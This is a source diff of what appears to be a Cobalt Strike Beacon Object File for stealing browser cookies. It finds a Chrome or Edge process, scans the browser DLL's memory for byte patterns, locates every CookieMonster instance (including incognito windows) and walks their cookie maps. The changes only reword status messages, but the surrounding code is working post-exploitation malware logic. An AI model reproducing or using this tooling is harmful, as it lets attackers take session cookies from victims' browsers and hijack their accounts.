@@ -63,7 +63,7 @@ extern "C" {
         BeaconDataParse(&parser, args, len);
         if (parser.original == 0)
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "[-] Missing mandatory argument /chrome or /edge!\n");
+            BeaconPrintf(CALLBACK_ERROR, "Missing mandatory argument /chrome or /edge!\n");
             return;
         }
         targetConfig = BeaconDataExtract(&parser, NULL);
@@ -78,7 +78,7 @@ extern "C" {
         //If chrome
         if (_stricmp(targetConfig, "/chrome") == 0) 
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Chrome\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Chrome\n");
             processName = L"chrome.exe";
             dllName = L"chrome.dll";
             szActualPattern = 105;
@@ -104,7 +104,7 @@ extern "C" {
 
         }  //If edge
         else if (_stricmp(targetConfig, "/edge") == 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Edge\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "Targeting Edge\n");
             processName = L"msedge.exe";
             dllName = L"msedge.dll";
             szActualPattern = 144;
@@ -130,60 +130,60 @@ extern "C" {
         }
         else
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "[-] No target type specified! Use /edge or /chrome to specify target!\n");
+            BeaconPrintf(CALLBACK_ERROR, "No target type specified! Use /edge or /chrome to specify target!\n");
             return;
         }
 
         HANDLE hChrome;
         if (chromePid != 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Targeting the supplied PID: %d\n", chromePid);
+            BeaconPrintf(CALLBACK_OUTPUT, "Using the supplied PID: %d\n", chromePid);
             if (!GetChromeHandle(chromePid, &hChrome))
             {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get handle\n");
+                BeaconPrintf(CALLBACK_ERROR, "Failed to get handle\n");
                 return;
             }
         }
         else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] No PID specified, searching for browser process\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "No PID specified, searching for browser process\n");
             if (!FindCorrectProcessPID(processName, &chromePid, &hChrome)) {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find suitable browser process\n");
+                BeaconPrintf(CALLBACK_ERROR, "Failed to find suitable browser process\n");
                 return;
             }
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Targeting PID: %d\n", chromePid);
+            BeaconPrintf(CALLBACK_OUTPUT, "Targeting PID: %d\n", chromePid);
         }
 
         uintptr_t baseAddress = 0;
         DWORD moduleSize = 0;
         if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize))
         {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find %ls base address!\n", dllName);
+            BeaconPrintf(CALLBACK_ERROR, "Failed to find %ls base address!\n", dllName);
             CloseHandle(hChrome);
             return;
         }
         
 #ifdef _DEBUG
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found the %ls base address on 0x%p\n", dllName,(void*)baseAddress);
+        BeaconPrintf(CALLBACK_OUTPUT, "Found the %ls base address on 0x%p\n", dllName,(void*)baseAddress);
 #endif
         uintptr_t resultAddress = 0;
         if (!FindDllPattern(hChrome, pattern, szActualPattern, baseAddress, moduleSize, resultAddress)) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to find the first pattern\n");
+            BeaconPrintf(CALLBACK_ERROR, "Failed to find the first pattern\n");
             CloseHandle(hChrome);
             return;
         }
 
 #ifdef _DEBUG
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found first pattern on 0x%p\n", (void*)resultAddress);
+        BeaconPrintf(CALLBACK_OUTPUT, "Found first pattern on 0x%p\n", (void*)resultAddress);
 #endif
         BYTE secondPattern[sizeof(uintptr_t)];
         ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));
 
         if (!FindDllPattern(hChrome, secondPattern, sizeof(uintptr_t), baseAddress, moduleSize, resultAddress)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find the first target pattern!\n");
+            BeaconPrintf(CALLBACK_ERROR, "Failed to find the first target pattern!\n");
             CloseHandle(hChrome);
             return;
         }
 #ifdef _DEBUG
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found second pattern on 0x%p\n", (void*)resultAddress);
+        BeaconPrintf(CALLBACK_OUTPUT, "Found second pattern on 0x%p\n", (void*)resultAddress);
 #endif
         BYTE thirdPattern[sizeof(uintptr_t)];
         ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));
@@ -191,16 +191,16 @@ extern "C" {
         uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
         size_t szCookieMonster = 0;
         if (CookieMonsterInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), CookieMonsterInstances, szCookieMonster)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find the third pattern!\n");
+            BeaconPrintf(CALLBACK_ERROR, "Failed to find the third pattern!\n");
             CloseHandle(hChrome);
             free(CookieMonsterInstances);
             return;
     }
 #ifdef _DEBUG
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %zu instances of CookieMonster!\n", szCookieMonster);
+        BeaconPrintf(CALLBACK_OUTPUT, "Found %zu instances of CookieMonster!\n", szCookieMonster);
 
         for (size_t i = 0; i < szCookieMonster; i++)
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Found CookieMonster on 0x%p\n", (void*)CookieMonsterInstances[i]);
+            BeaconPrintf(CALLBACK_OUTPUT, "Found CookieMonster on 0x%p\n", (void*)CookieMonsterInstances[i]);
 #endif
         //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
         //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
@@ -212,7 +212,7 @@ extern "C" {
             uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
             CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
 #ifdef _DEBUG
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] CookieMap should be found in address 0x%p\n", (void*)CookieMapOffset);
+            BeaconPrintf(CALLBACK_OUTPUT, "CookieMap should be in address 0x%p\n", (void*)CookieMapOffset);
 #endif
             WalkCookieMap(hChrome, CookieMapOffset);
         }
@@ -220,7 +220,7 @@ extern "C" {
         CloseHandle(hChrome);
         free(CookieMonsterInstances);
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "Done\n");
     }
 }
 
